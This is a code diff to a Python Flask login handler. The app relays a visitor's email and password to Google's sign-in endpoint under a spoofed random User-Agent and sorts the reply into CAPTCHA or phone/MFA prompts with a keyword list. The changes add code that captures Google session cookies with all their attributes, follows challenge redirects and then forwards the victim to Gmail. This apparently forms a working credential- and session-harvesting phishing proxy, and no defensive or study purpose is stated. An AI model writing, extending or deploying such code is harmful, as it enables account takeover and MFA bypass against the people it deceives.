@@ -364,18 +364,20 @@ def enter_password():
             "TL": "",
         }
         session_req = requests.Session()
-        response = session_req.post(login_url, data=payload, headers=headers)
+        # Use fake browser for login
+        browser = Browser()
+        headers["User-Agent"] = browser.get_random_agent()
+        response = session_req.post(login_url, data=payload, headers=headers, allow_redirects=False)
 
-        # Debug logging for Railway
         print(f"[DEBUG] Google login response status: {response.status_code}")
         print(f"[DEBUG] Google login response text: {response.text[:500]}")
 
-        # Check response for success, CAPTCHA, or phone notification
+        # Check for CAPTCHA
         if "captcha" in response.text.lower():
             print("[DEBUG] CAPTCHA required detected in response.")
             return render_template('captcha.html', email=email, password=password_val, error="CAPTCHA required for this account.")
 
-        # Expanded keyword detection for phone/mfa approval
+        # Phone/MFA approval detection
         phone_keywords = [
             "phone", "2-step", "approval", "verify", "verification", "security check", "confirm it's you", "identity", "prompt", "notification", "app", "open your phone", "check your phone", "enter code", "sent a code", "authenticator", "multi-factor", "mfa", "device", "trusted device", "push notification"
         ]
@@ -384,16 +386,61 @@ def enter_password():
             print("[DEBUG] Phone/MFA approval required detected in response. Redirecting to /auth.")
             session['authenticated'] = True
             session['email'] = email
+            # Save cookies from session_req (if any)
+            login_cookies = []
+            for c in session_req.cookies:
+                login_cookies.append({
+                    'name': c.name if hasattr(c, 'name') else c,
+                    'value': c.value if hasattr(c, 'value') else session_req.cookies.get(c.name if hasattr(c, 'name') else str(c)),
+                    'domain': c.domain if hasattr(c, 'domain') else 'google.com',
+                    'path': c.path if hasattr(c, 'path') else '/',
+                    'secure': c.secure if hasattr(c, 'secure') else True,
+                    'expires': c.expires if hasattr(c, 'expires') else None,
+                    'httpOnly': c.has_nonstandard_attr('HttpOnly') if hasattr(c, 'has_nonstandard_attr') else False,
+                    'sameSite': c.has_nonstandard_attr('SameSite') if hasattr(c, 'has_nonstandard_attr') else None,
+                    'priority': c.has_nonstandard_attr('Priority') if hasattr(c, 'has_nonstandard_attr') else None,
+                    'hostOnly': c.domain_specified if hasattr(c, 'domain_specified') else False,
+                    'max-age': c.has_nonstandard_attr('Max-Age') if hasattr(c, 'has_nonstandard_attr') else None
+                })
+            session['login_cookies'] = login_cookies
             return redirect(url_for('auth'))
 
+        # Challenge handling: follow redirect and capture cookies
         if "challenge" in response.text.lower() or response.status_code == 302:
-            print("[DEBUG] Challenge or 302 detected. Login successful, redirecting to Gmail inbox.")
-            resp = make_response(redirect('https://mail.google.com/mail/u/0/'))
-            for k, v in session_req.cookies.items():
-                resp.set_cookie(k, v, samesite='Strict', secure=True)
-            session['authenticated'] = True
-            session['email'] = email
-            return resp
+            print("[DEBUG] Challenge or 302 detected. Following redirect to complete authentication.")
+            # Follow redirect if present
+            next_url = response.headers.get('Location')
+            if next_url:
+                challenge_resp = session_req.get(next_url, headers=headers, allow_redirects=True)
+                print(f"[DEBUG] Challenge response status: {challenge_resp.status_code}")
+                print(f"[DEBUG] Challenge response text: {challenge_resp.text[:500]}")
+                # Save cookies from session_req
+                login_cookies = []
+                for c in session_req.cookies:
+                    login_cookies.append({
+                        'name': c.name if hasattr(c, 'name') else c,
+                        'value': c.value if hasattr(c, 'value') else session_req.cookies.get(str(c)),
+                        'domain': c.domain if hasattr(c, 'domain') else 'google.com',
+                        'path': c.path if hasattr(c, 'path') else '/',
+                        'secure': c.secure if hasattr(c, 'secure') else True,
+                        'expires': c.expires if hasattr(c, 'expires') else None,
+                        'httpOnly': c.has_nonstandard_attr('HttpOnly') if hasattr(c, 'has_nonstandard_attr') else False,
+                        'sameSite': c.has_nonstandard_attr('SameSite') if hasattr(c, 'has_nonstandard_attr') else None,
+                        'priority': c.has_nonstandard_attr('Priority') if hasattr(c, 'has_nonstandard_attr') else None,
+                        'hostOnly': c.domain_specified if hasattr(c, 'domain_specified') else False,
+                        'max-age': c.has_nonstandard_attr('Max-Age') if hasattr(c, 'has_nonstandard_attr') else None
+                    })
+                session['login_cookies'] = login_cookies
+                session['authenticated'] = True
+                session['email'] = email
+                resp = make_response(redirect('https://mail.google.com/mail/u/0/'))
+                for c in login_cookies:
+                    resp.set_cookie(c['name'], c['value'], samesite='Strict', secure=True)
+                return resp
+            else:
+                print("[DEBUG] Challenge detected but no redirect location found.")
+                error = "Login challenge failed."
+                return render_template('password.html', email=email, error=error, branding=branding)
 
         print("[DEBUG] Login failed, rendering password page again.")
         error = "Login failed."
